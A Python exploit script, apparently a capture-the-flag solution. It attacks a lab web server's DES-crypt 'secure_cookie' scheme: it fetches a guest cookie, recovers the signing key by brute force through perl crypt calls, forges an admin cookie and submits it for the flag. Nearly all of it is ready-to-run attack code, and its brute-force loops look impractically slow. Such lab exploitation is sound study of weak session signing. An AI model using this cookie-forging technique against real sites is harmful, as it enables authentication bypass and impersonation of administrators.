#!/usr/bin/env python3
"""
Run this on your Kali machine.
Uses perl subprocess for DES crypt (since Python 3.13 removed crypt module).
"""
import subprocess, requests, urllib.parse, re, sys

UA = "curl/8.19.0"
TARGET = "http://10.48.169.51/"

def des_crypt(text, salt):
    # Escape special chars for perl one-liner
    text_esc = text.replace("\\", "\\\\").replace("'", "\\'")
    salt_esc = salt.replace("\\", "\\\\").replace("'", "\\'")
    r = subprocess.run(
        ['perl', '-e', f"print crypt('{text_esc}', '{salt_esc}')"],
        capture_output=True, text=True
    )
    return r.stdout

def make_cookie(text, salt):
    out = ""
    for i in range(0, len(text), 8):
        out += des_crypt(text[i:i+8], salt)
    return out

# ── Step 1: Fetch current cookie ──────────────────────────────────────────────
print("[*] Fetching current guest cookie...")
sess = requests.Session()
sess.headers.update({"User-Agent": UA})
r = sess.get(TARGET, allow_redirects=False)

# requests follows redirects; get raw Set-Cookie
all_headers = r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw.headers, 'getlist') else []
cookie_header = "; ".join(r.headers.getlist("Set-Cookie") if hasattr(r.headers, 'getlist') else [r.headers.get("Set-Cookie","")])

match = re.search(r'secure_cookie=([^;,\s]+)', cookie_header)
if not match:
    # Try via requests cookies
    raw_cookie = urllib.parse.unquote(r.cookies.get("secure_cookie", ""))
else:
    raw_cookie = urllib.parse.unquote(match.group(1))

if not raw_cookie:
    print("[-] Couldn't get cookie. Try: python3 forge_admin.py <cookie_value>")
    if len(sys.argv) > 1:
        raw_cookie = sys.argv[1]
    else:
        sys.exit(1)

salt = raw_cookie[:2]
num_chunks = len(raw_cookie) // 13
print(f"[+] Cookie: {raw_cookie}")
print(f"[+] Salt: {salt}, Chunks: {num_chunks}")

# ── Step 2: Verify we understand the structure ────────────────────────────────
c1 = des_crypt("guest:cu", salt)
c2 = des_crypt("rl/8.19.", salt)
print(f"\n[*] Chunk1 match: {c1 == raw_cookie[0:13]}")
print(f"[*] Chunk2 match: {c2 == raw_cookie[13:26]}")

if c1 != raw_cookie[0:13]:
    print("[-] Chunk mismatch! Check UA string.")
    sys.exit(1)

# ── Step 3: Forge admin cookie (we need the key for full verification) ────────
# The key is IN the cookie — we can recover it chunk by chunk
# Plaintext chunks of "guest:curl/8.19.0:<KEY>":
#   [0]  guest:cu   (known)
#   [1]  rl/8.19.   (known)
#   [2]  0:<KEY_CH  (KEY starts at index 2)
#   [3]  UNKS>....  (more KEY)
#   ...

# DES only uses first 8 chars, so we can brute-force each 8-char chunk
import string, itertools

print("\n[*] Brute-forcing key from chunk 3...")
charset = string.ascii_letters + string.digits + "_-!@#"

# Chunk 3: plaintext = "0:" + key[0:6]
target_c3 = raw_cookie[26:39]
key = ""

found = False
for l in range(1, 7):
    if found: break
    for combo in itertools.product(charset, repeat=l):
        candidate = "0:" + ''.join(combo)
        if len(candidate) == 8:
            if des_crypt(candidate, salt) == target_c3:
                key += ''.join(combo)
                found = True
                print(f"[+] Key chars 0-5: {''.join(combo)}")
                break

if found and num_chunks > 3:
    # Chunk 4+: pure key chars, 8 at a time
    for chunk_idx in range(3, num_chunks):
        target = raw_cookie[chunk_idx*13:(chunk_idx+1)*13]
        chunk_found = False
        for l in range(1, 9):
            if chunk_found: break
            for combo in itertools.product(charset, repeat=l):
                candidate = ''.join(combo)
                if len(candidate) == 8:
                    if des_crypt(candidate, salt) == target:
                        key += candidate
                        print(f"[+] Key chunk {chunk_idx}: {candidate}")
                        chunk_found = True
                        break
        if not chunk_found:
            print(f"[!] Couldn't crack chunk {chunk_idx}, key so far: {key}")
            break

print(f"\n[+] Recovered KEY: {key}")

# ── Step 4: Forge admin cookie and get flag ───────────────────────────────────
admin_string = f"admin:{UA}:{key}"
print(f"\n[*] Forging cookie for: {admin_string}")
forged = make_cookie(admin_string, salt)
print(f"[+] Forged cookie: {forged}")

print("\n[*] Sending forged cookie...")
r2 = requests.get(TARGET,
    headers={"User-Agent": UA},
    cookies={"user": "admin", "secure_cookie": forged})
print(f"[+] Response:\n{r2.text[:500]}")
